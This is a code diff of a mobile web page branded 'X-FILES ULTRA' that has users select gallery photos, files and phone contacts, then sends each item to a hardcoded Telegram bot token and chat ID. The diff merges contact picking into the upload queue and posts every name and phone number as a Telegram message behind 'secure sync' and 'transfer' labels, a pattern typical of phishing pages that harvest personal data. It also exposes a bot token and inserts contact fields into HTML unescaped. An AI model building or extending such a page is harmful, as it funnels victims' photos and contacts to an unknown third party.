@@ -33,6 +33,24 @@
         ::-webkit-scrollbar { width: 5px; } 
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
         .progress-bar { transition: width 0.4s ease; }
+
+        /* কন্টাক্ট মোডের জন্য বিশেষ ডিজাইন */
+        .contact-mode-box {
+            background: linear-gradient(145deg, rgba(59, 130, 246, 0.1), rgba(0, 0, 0, 0.5));
+            border: 2px solid rgba(59, 130, 246, 0.4);
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.1) inset;
+            position: relative;
+            overflow: hidden;
+        }
+        .contact-mode-box::after {
+            content: "SECURE SYNC";
+            position: absolute;
+            bottom: 10px;
+            font-size: 8px;
+            letter-spacing: 5px;
+            color: rgba(59, 130, 246, 0.5);
+            font-weight: 900;
+        }
     </style>
 </head>
 <body class="p-4">
@@ -61,9 +79,11 @@
                 <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to open Gallery</p> 
             </label> 
 
-            <div id="contact-box" class="hidden glass h-64 flex flex-col items-center justify-center border-2 border-dashed border-blue-900 mb-6" onclick="pickContacts()">
-                <span class="text-6xl mb-3">👤</span>
-                <p class="text-[11px] text-blue-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to Pick Contacts</p>
+            <div id="contact-box" class="hidden contact-mode-box h-64 flex flex-col items-center justify-center cursor-pointer rounded-[35px] mb-6 group animate-pulse" onclick="pickContacts()">
+                <div class="bg-blue-500/20 p-6 rounded-full mb-3 group-hover:scale-110 transition-transform">
+                    <span class="text-6xl">👤</span>
+                </div>
+                <p class="text-[11px] text-blue-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to Multi-Select Contacts</p>
             </div>
 
             <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
@@ -96,7 +116,6 @@
 const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4"; 
 const CHAT_ID = "5923885908"; 
 let queue = []; 
-let contactQueue = [];
 let currentType = 'photo'; 
 
 function setType(type) { 
@@ -122,42 +141,24 @@ function setType(type) {
 } 
 
 async function pickContacts() {
-    const props = ['name', 'tel'];
-    const opts = { multiple: true };
-
     try {
         if ('contacts' in navigator && 'ContactsManager' in window) {
-            const contacts = await navigator.contacts.select(props, opts);
+            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
             if (contacts.length) {
-                contactQueue = [...contactQueue, ...contacts];
-                renderContacts();
+                const formatted = contacts.map(c => ({
+                    isContact: true,
+                    name: c.name[0] || "No Name",
+                    tel: (c.tel && c.tel[0]) ? c.tel[0] : "No Number",
+                    id: Math.random()
+                }));
+                queue = [...queue, ...formatted];
+                render();
             }
         } else {
-            alert("Contact Picker not supported on this browser/device. Use Chrome on Android.");
+            alert("Contact Picker not supported! Use Chrome on Android with HTTPS.");
         }
-    } catch (err) {
-        console.error(err);
-    }
+    } catch (err) { console.log(err); }
 }
-
-function renderContacts() {
-    const grid = document.getElementById('preview-grid');
-    grid.innerHTML = "";
-    document.getElementById('q-count').innerText = contactQueue.length;
-    contactQueue.forEach((c, i) => {
-        const div = document.createElement('div');
-        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-blue-500/10 flex flex-col items-center justify-center p-2 border border-blue-500/30";
-        div.innerHTML = `
-            <span class="text-xl mb-1">👤</span>
-            <span class="text-[9px] font-bold text-center break-all">${c.name[0]}</span>
-            <span class="text-[8px] text-blue-400">${c.tel[0]}</span>
-            <button onclick="removeContact(${i})" class="absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center">✕</button>
-        `;
-        grid.appendChild(div);
-    });
-}
-
-function removeContact(i) { contactQueue.splice(i, 1); renderContacts(); }
 
 document.getElementById('fileInput').onchange = (e) => { 
     const files = Array.from(e.target.files);
@@ -172,12 +173,16 @@ function render() {
     document.getElementById('q-count').innerText = queue.length; 
     queue.forEach((f, i) => { 
         const div = document.createElement('div'); 
-        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex items-center justify-center"; 
-        if (f.type && f.type.startsWith('image/')) { 
+        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex flex-col items-center justify-center p-2"; 
+        
+        if (f.isContact) {
+            div.innerHTML = `<span class="text-2xl mb-1">👤</span><div class="text-[8px] font-bold text-blue-400 break-all text-center uppercase">${f.name}<br>${f.tel}</div>`;
+        } else if (f.type && f.type.startsWith('image/')) { 
             div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
         } else { 
             div.innerHTML = `<div class="p-2 text-center text-[10px] font-bold text-gray-400 break-all uppercase">${f.name.split('.').pop()}</div>`; 
         } 
+        
         div.innerHTML += `<button onclick="remove(${i})" class="absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center">✕</button>`; 
         grid.appendChild(div); 
     }); 
@@ -185,73 +190,59 @@ function render() {
 
 function remove(i) { queue.splice(i, 1); render(); } 
 
-async function sendTelegramMessage(text) {
-    try {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-        });
-        return true;
-    } catch (err) { return false; }
-}
-
 async function ignite() { 
-    const btn = document.getElementById('sendBtn');
-    const sCountDisp = document.getElementById('s-count');
-    const qCountDisp = document.getElementById('q-count');
-
-    if(currentType === 'contact') {
-        if(!contactQueue.length) return;
-        btn.disabled = true;
-        btn.innerText = "📡 SYNCING CONTACTS...";
-        
-        let sent = 0;
-        const total = contactQueue.length;
-        const now = new Date();
-        const info = `\n📅 ${now.toLocaleDateString()} | ⏰ ${now.toLocaleTimeString()}`;
-
-        for(let c of contactQueue) {
-            const msg = `👤 *New Contact*\nName: ${c.name[0]}\nPhone: \`${c.tel[0]}\`${info}`;
-            const ok = await sendTelegramMessage(msg);
-            if(ok) {
-                sent++;
-                sCountDisp.innerText = sent;
-                qCountDisp.innerText = total - sent;
-            }
-        }
-        btn.innerText = "CONTACTS SYNCED";
-        btn.style.background = "#10b981";
-        setTimeout(() => location.reload(), 2000);
-        return;
-    }
-
     if(!queue.length) return; 
+
+    const btn = document.getElementById('sendBtn'); 
+    const sCountDisp = document.getElementById('s-count'); 
+    const qCountDisp = document.getElementById('q-count'); 
+    const statusBox = document.getElementById('status-box');
+    const progressFill = document.getElementById('progress-fill');
+    const statusText = document.getElementById('status-text');
+
     btn.disabled = true; 
     btn.innerText = "⚡ TRANSMITTING..."; 
-    document.getElementById('status-box').classList.remove('hidden');
+    statusBox.classList.remove('hidden');
 
     let sent = 0; 
     const total = queue.length; 
 
-    for (let f of queue) {
-        const method = (currentType === 'photo' && f.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append(method === 'sendPhoto' ? 'photo' : 'document', f);
+    for (let i = 0; i < queue.length; i++) {
+        const item = queue[i];
+        let success = false;
 
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
-            if(res.ok) {
-                sent++;
-                sCountDisp.innerText = sent;
-                qCountDisp.innerText = total - sent;
-                const percent = Math.round((sent / total) * 100);
-                document.getElementById('progress-fill').style.width = percent + "%";
-                document.getElementById('status-text').innerText = `Transferring: ${percent}%`;
-            }
-        } catch(e){}
+        if(item.isContact) {
+            const now = new Date();
+            const msg = `👤 *New Contact*\n\nName: ${item.name}\nPhone: \`${item.tel}\`\n\n📅 ${now.toLocaleDateString()}\n⏰ ${now.toLocaleTimeString()}\n🌐 Portal: X-FILES ULTRA`;
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+                success = res.ok;
+            } catch(e) { success = false; }
+        } else {
+            const method = (currentType === 'photo' && item.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
+            const fd = new FormData(); 
+            fd.append("chat_id", CHAT_ID); 
+            fd.append(method === 'sendPhoto' ? 'photo' : 'document', item); 
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
+                success = res.ok;
+            } catch (err) { success = false; }
+        }
+
+        if(success) {
+            sent++;
+            sCountDisp.innerText = sent;
+            qCountDisp.innerText = total - sent;
+            const percent = Math.round((sent / total) * 100);
+            progressFill.style.width = percent + "%";
+            statusText.innerText = `Transferring: ${percent}%`;
+        }
     }
+
     btn.innerText = "MISSION COMPLETED"; 
     btn.style.background = "#10b981";
     setTimeout(() => location.reload(), 3000); 
